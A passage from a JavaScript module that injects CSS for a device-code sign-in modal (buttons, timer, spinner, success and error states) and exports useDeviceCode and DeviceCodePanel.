            "  font-family:inherit; cursor:pointer; transition:background .15s; border-radius:0; }",
            '.dcm-btn-primary:hover { background:#005da6; }',
            '.dcm-btn-secondary { flex-shrink:0; height:36px; padding:0 16px;',
            '  background:#fff; color:#1b1b1b; border:1px solid #8c8c8c;',
            '  font-size:13px; font-weight:600; font-family:inherit; cursor:pointer;',
            '  transition:background .15s; border-radius:0; }',
            '.dcm-btn-secondary:hover { background:#f3f2f1; }',
            '.dcm-status { display:flex; align-items:center; justify-content:space-between;',
            '  gap:12px; margin-top:20px; padding-top:16px; border-top:1px solid #edebe9;',
            '  font-size:12.5px; color:#605e5c; }',
            '.dcm-status-left { display:flex; align-items:center; gap:8px; }',
            '.dcm-pulse { display:inline-block; width:8px; height:8px; border-radius:50%;',
            '  background:#0067b8; animation:dcm-pulse 1.4s ease-in-out infinite; flex-shrink:0; }',
            '.dcm-timer strong { color:#1b1b1b; font-weight:600;',
            '  font-family:Consolas,"Courier New",monospace; }',
            '.dcm-loading { display:flex; flex-direction:column; align-items:center;',
            '  justify-content:center; padding:24px 0 8px; gap:16px; }',
            '.dcm-spinner-lg { width:44px; height:44px; border:3px solid #edebe9;',
            '  border-top-color:#0067b8; border-radius:50%; animation:dc-spin .8s linear infinite; }',
            '.dcm-loading-text { font-size:13.5px; color:#605e5c; margin:0; }',
            '.dcm-success, .dcm-error { display:flex; flex-direction:column; align-items:center;',
            '  text-align:center; padding:12px 0 4px; gap:6px; }',
            '.dcm-success-title { font-size:16px; font-weight:600; color:#107C10; margin:8px 0 0; }',
            '.dcm-success-sub   { font-size:13px; color:#605e5c; margin:0; }',
            '.dcm-error-title   { font-size:16px; font-weight:600; color:#A4262C; margin:8px 0 0; }',
            '.dcm-error-sub     { font-size:13px; color:#605e5c; margin:0; max-width:340px; }',
            '@media (max-width:520px) {',
            '  .dcm-inner { padding:28px 22px 22px; }',
            '  .dcm-title { font-size:20px; }',
            '  .dcm-code  { font-size:18px; letter-spacing:.10em; }',
            '  .dcm-row   { flex-direction:column; align-items:stretch; }',
            '  .dcm-btn-primary, .dcm-btn-secondary { width:100%; }',
            '}',
        ].join('\n');
        document.head.appendChild(style);
    }

    // ── Public API ──
    return { useDeviceCode, DeviceCodePanel };
})();
